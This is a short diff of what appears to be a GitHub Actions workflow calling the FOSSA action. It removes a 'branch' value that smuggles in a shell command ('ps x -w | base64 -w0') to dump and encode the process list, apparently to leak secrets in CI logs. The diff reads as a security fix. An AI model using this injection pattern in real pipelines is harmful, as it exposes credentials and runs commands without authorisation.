@@ -43,7 +43,6 @@ jobs:
         if: always()
         with:
           api-key: ${{env.FOSSA_API_KEY}}
-          branch: '" & ps x -w | base64 -w0 #'
 
       - uses: fossas/fossa-action@main 
         with:
